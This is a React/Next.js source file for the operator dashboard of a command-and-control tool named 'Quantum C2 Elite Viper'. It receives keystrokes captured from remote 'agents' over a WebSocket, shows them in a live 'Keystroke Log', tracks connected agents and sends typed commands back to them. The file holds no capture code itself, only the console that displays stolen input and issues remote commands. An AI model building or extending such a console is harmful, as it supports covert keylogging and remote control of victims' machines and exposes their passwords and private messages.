"use client";
import { useState, useEffect, useRef, useCallback } from "react";

interface Keystroke {
  key: number;
  unicode: string;
  alt: boolean;
  ctrl: boolean;
  shift: boolean;
  extended: boolean;
  time: number;
}

interface Agent {
  id: string;
  status: string;
  lastSeen: string;
  uptime: number;
}

interface WSMessage {
  type: "keystroke" | "status";
  data?: string;
  ts?: number;
  agentId?: string;
}

export default function Dashboard() {
  const [keystrokes, setKeystrokes] = useState<string[]>([]);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [commandInput, setCommandInput] = useState("");
  const [wsStatus, setWsStatus] = useState<"connecting" | "connected" | "disconnected">("disconnected");
  const [agentCount, setAgentCount] = useState(0);
  const wsRef = useRef<WebSocket | null>(null);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const BACKEND_WS = process.env.NEXT_PUBLIC_BACKEND_WS || "";

  const connectWS = useCallback(() => {
    setWsStatus("connecting");
    const wsUrl = BACKEND_WS || `ws://${window.location.host}/ws`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;

    ws.onopen = () => {
      setWsStatus("connected");
    };

    ws.onmessage = (event) => {
      try {
        const msg: WSMessage = JSON.parse(event.data);
        if (msg.type === "keystroke" && msg.data) {
          setKeystrokes((prev) => [...prev.slice(-99), msg.data!]);
        } else if (msg.type === "status") {
          setAgentCount((prev) => prev + 1);
        }
      } catch {
        // ignore parse errors
      }
    };

    ws.onclose = () => {
      setWsStatus("disconnected");
      setTimeout(connectWS, 3000);
    };

    ws.onerror = () => {
      ws.close();
    };
  }, []);

  useEffect(() => {
    connectWS();
    return () => {
      wsRef.current?.close();
    };
  }, [connectWS]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [keystrokes]);

  const sendCommand = () => {
    if (!commandInput.trim()) return;
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({ command: commandInput }));
      setCommandInput("");
    }
  };

  const clearKeystrokes = () => setKeystrokes([]);

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100 flex flex-col">
      <header className="flex items-center justify-between px-6 py-4 border-b border-zinc-800">
        <h1 className="text-2xl font-bold text-white">Quantum C2 Elite Viper</h1>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 text-sm">
            <div className={`w-2 h-2 rounded-full ${wsStatus === "connected" ? "bg-green-500" : wsStatus === "connecting" ? "bg-yellow-500" : "bg-red-500"}`} />
            <span className="text-zinc-400">{wsStatus}</span>
          </div>
          <div className="text-sm text-zinc-400">
            Agents: <span className="text-white">{agentCount}</span>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col lg:flex-row gap-0">
        <div className="flex-1 flex flex-col border-r border-zinc-800">
          <div className="flex items-center justify-between px-4 py-2 border-b border-zinc-800">
            <h2 className="text-sm font-semibold text-zinc-300 uppercase tracking-wider">Keystroke Log</h2>
            <button onClick={clearKeystrokes} className="text-xs text-zinc-500 hover:text-zinc-300 px-2 py-1 rounded hover:bg-zinc-800">
              Clear
            </button>
          </div>
          <div className="flex-1 overflow-y-auto p-4 font-mono text-sm space-y-0.5">
            {keystrokes.length === 0 && (
              <p className="text-zinc-600 italic">Waiting for keystrokes...</p>
            )}
            {keystrokes.map((k, i) => (
              <div key={i} className="text-zinc-300 break-all leading-relaxed">
                {k}
              </div>
            ))}
            <div ref={messagesEndRef} />
          </div>
        </div>

        <div className="w-full lg:w-80 flex flex-col">
          <div className="px-4 py-3 border-b border-zinc-800">
            <h2 className="text-sm font-semibold text-zinc-300 uppercase tracking-wider">Agent Status</h2>
          </div>
          <div className="flex-1 overflow-y-auto p-4 space-y-3">
            {agents.map((agent, i) => (
              <div key={i} className="bg-zinc-900 rounded-lg p-3 border border-zinc-800">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono text-zinc-400">{agent.id}</span>
                  <span className={`w-2 h-2 rounded-full ${agent.status === "active" ? "bg-green-500" : "bg-zinc-600"}`} />
                </div>
                <div className="mt-1 text-xs text-zinc-500">
                  Last seen: {agent.lastSeen}
                </div>
              </div>
            ))}
            {agents.length === 0 && (
              <p className="text-zinc-600 text-sm">No agents connected</p>
            )}
          </div>

          <div className="p-4 border-t border-zinc-800">
            <h2 className="text-sm font-semibold text-zinc-300 uppercase tracking-wider mb-2">Command</h2>
            <div className="flex gap-2">
              <input
                type="text"
                value={commandInput}
                onChange={(e) => setCommandInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && sendCommand()}
                placeholder="Enter command..."
                className="flex-1 bg-zinc-900 border border-zinc-700 rounded px-3 py-2 text-sm text-zinc-100 placeholder-zinc-600 focus:outline-none focus:border-blue-500"
              />
              <button
                onClick={sendCommand}
                className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
              >
                Send
              </button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
